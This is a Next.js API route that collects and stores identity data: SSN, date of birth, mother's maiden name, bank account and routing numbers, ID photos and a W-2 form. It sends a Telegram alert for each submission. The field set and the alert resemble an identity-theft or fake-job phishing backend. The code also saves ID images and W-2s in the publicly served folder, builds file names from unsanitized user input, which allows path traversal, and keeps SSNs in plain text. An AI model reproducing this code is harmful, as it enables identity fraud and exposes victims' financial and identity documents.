import { NextResponse } from 'next/server';
import { writeFile, mkdir } from 'fs/promises';
import path from 'path';
import { sql } from '@vercel/postgres';
import { randomUUID } from 'crypto';
import { sendTelegramNotification } from '@/app/lib/sendTelegramNotification';

export async function POST(req: Request) {
  try {
    /* ────── Parse multipart form ────── */
    const formData = await req.formData();

    /* ── Scalars ─────────────────────── */
    const get = (k: string) => formData.get(k)?.toString() ?? '';
    const applicant_id   = get('applicant_id');
    const first_name     = get('first_name');
    const middle_name    = get('middle_name');
    const last_name      = get('last_name');
    const mother_maiden  = get('motherMaidenName');
    const ssn            = get('ssn');
    const date_of_birth  = get('date_of_birth');
    const routing_number = get('routing_number');
    const account_number = get('account_number');
    const bank_name      = get('bank_name');

    /* ── Address ─────────────────────── */
    const street   = get('address.street').trim();
    const city     = get('address.city').trim();
    const state    = get('address.state').trim();
    const zip_code = get('address.zip_code').trim();

    if (![street, city, state, zip_code].every(Boolean)) {
      return NextResponse.json(
        { error: 'All address fields (street, city, state, zip) are required.' },
        { status: 400 },
      );
    }

    /* ── Files ───────────────────────── */
    const front_image = formData.get('front_image') as File | null;
    const back_image  = formData.get('back_image')  as File | null;
    const w2_form     = formData.get('w2_form')     as File | null;

    if (!front_image || !back_image || !w2_form) {
      return NextResponse.json(
        { error: 'Front ID, back ID, and W‑2 form are required.' },
        { status: 400 },
      );
    }

    const IMG_TYPES = ['image/jpeg', 'image/png', 'image/webp'];
    const PDF_TYPES = ['application/pdf'];
    const MAX_IMG = 5 * 1024 * 1024;  // 5 MB
    const MAX_PDF = 10 * 1024 * 1024; // 10 MB

    const badImg = (f: File) => !IMG_TYPES.includes(f.type) || f.size > MAX_IMG;
    const badPdf = (f: File) => !PDF_TYPES.includes(f.type) || f.size > MAX_PDF;

    if (badImg(front_image) || badImg(back_image) || badPdf(w2_form)) {
      return NextResponse.json(
        { error: 'Images must be JPEG/PNG/WebP ≤ 5 MB and W‑2 must be PDF ≤ 10 MB.' },
        { status: 400 },
      );
    }

    /* ── Persist files ───────────────── */
    const saveFile = async (file: File, label: 'front' | 'back' | 'w2') => {
      const ext = file.type.split('/')[1] || 'bin';
      const sub = label === 'w2' ? 'w2s' : 'onboarding';
      const folder = path.join(process.cwd(), 'public', sub);
      await mkdir(folder, { recursive: true });
      const filename = `${label}-${first_name}-${last_name}-${randomUUID()}.${ext}`;
      const fullPath = path.join(folder, filename);
      await writeFile(fullPath, Buffer.from(await file.arrayBuffer()));
      return { url: `/${sub}/${filename}`, mime: file.type };
    };

    const { url: front_image_url, mime: front_image_mime } = await saveFile(front_image, 'front');
    const { url: back_image_url,  mime: back_image_mime  } = await saveFile(back_image,  'back');
    const { url: w2_form_url,     mime: w2_form_mime     } = await saveFile(w2_form,   'w2');

    /* ── Insert / Upsert ─────────────── */
    await sql`
      INSERT INTO onboarding (
        applicant_id, first_name, middle_name, last_name, mother_maiden_name,
        ssn, date_of_birth,
        street, city, state, zip_code,
        account_number, routing_number, bank_name,
        front_image_url, back_image_url, w2_form_url,
        front_image_mime, back_image_mime, w2_form_mime,
        onboarding_completed, onboarding_date
      )
      VALUES (
        ${applicant_id}, ${first_name}, ${middle_name}, ${last_name}, ${mother_maiden},
        ${ssn}, ${date_of_birth},
        ${street}, ${city}, ${state}, ${zip_code},
        ${account_number}, ${routing_number}, ${bank_name},
        ${front_image_url}, ${back_image_url}, ${w2_form_url},
        ${front_image_mime}, ${back_image_mime}, ${w2_form_mime},
        TRUE, NOW()
      )
      ON CONFLICT (applicant_id) DO UPDATE SET
        first_name          = EXCLUDED.first_name,
        middle_name         = EXCLUDED.middle_name,
        last_name           = EXCLUDED.last_name,
        mother_maiden_name  = EXCLUDED.mother_maiden_name,
        ssn                 = EXCLUDED.ssn,
        date_of_birth       = EXCLUDED.date_of_birth,
        street              = EXCLUDED.street,
        city                = EXCLUDED.city,
        state               = EXCLUDED.state,
        zip_code            = EXCLUDED.zip_code,
        account_number      = EXCLUDED.account_number,
        routing_number      = EXCLUDED.routing_number,
        bank_name           = EXCLUDED.bank_name,
        front_image_url     = EXCLUDED.front_image_url,
        back_image_url      = EXCLUDED.back_image_url,
        w2_form_url         = EXCLUDED.w2_form_url,
        front_image_mime    = EXCLUDED.front_image_mime,
        back_image_mime     = EXCLUDED.back_image_mime,
        w2_form_mime        = EXCLUDED.w2_form_mime,
        onboarding_completed = TRUE,
        onboarding_date     = NOW();
    `;

    /* ── Telegram ping (optional) ────── */
    await sendTelegramNotification(
      `📥 New onboarding:\n👤 ${first_name} ${last_name}\n🏦 Bank: ${bank_name}`,
    );

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error('❌ Onboarding error:', err);
    return NextResponse.json(
      { error: 'Failed to complete onboarding.' },
      { status: 500 },
    );
  }
}
